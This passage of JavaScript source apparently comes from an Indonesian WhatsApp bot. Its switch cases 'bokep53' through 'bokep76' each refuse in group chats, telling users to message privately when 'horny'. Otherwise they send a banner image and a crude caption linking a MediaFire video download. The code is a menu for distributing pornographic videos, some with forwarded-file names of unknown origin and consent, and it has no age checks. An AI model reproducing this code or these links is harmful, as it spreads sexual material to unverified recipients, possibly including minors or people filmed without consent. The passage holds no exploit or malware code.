				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/jr9kd9lo0rshfnc/received_492047558937708.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep53':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/trg1m5bs22daq13/received_1058073754965172.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep54':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/84tjcg8lfigchsh/received_4227104060750060.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep55':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/4wdzdyewf9hdhl1/received_390083809441180.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep56':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/c8zjcw3gjlo1jlw/received_389467039555184.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep57':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/dziuepg6m5bhfkl/received_399251051830914.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep58':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/4bpl7m7qseetxni/received_3097536497238052.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep59':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/1v7980xpuu0oonn/received_584624689245337.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep60':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/ch634xh1fc9qfhk/received_1666211303778780.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep61':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/0hsizq9yowiu6u9/received_590652791967744.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep62':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/61wklfu7icfrr1k/received_4259380677520916.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep63':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/dqjcd8tpo4cu471/received_269741168374510.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep64':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/9fy9dsm8ink8aaq/received_957169441499997.mp4/file' })				   
		 break
  //=========================================================  
  case 'bokep65':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/hdxw18b28jqszev/received_880297542613744.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep66':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/5b80x1q47ody0v5/received_605942373760921.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep67':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/ua0e1om3k9mbl0a/received_1027423954495771.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep68':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/9ybkxix5c2igbgi/received_1661970210679064.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep69':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/l2148ap908483x0/received_468655110911870.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep70':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/rya23e0lcwnww7t/received_391252732663323.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep71':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/kq9v0977mlvr5th/received_2970346673217135.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep72':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/4fxizepseti0lmx/received_847640339228073.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep73':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/cs0rjcibz1vjn7n/received_292426832387830.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep74':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/zyy0jvwxfbem33d/received_2980088018879894.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep75':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/2w3z0xefb9xzf0f/received_257088666186312.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep76':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/sgvfgu8s81kp9q4/received_446852896760262.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep77':
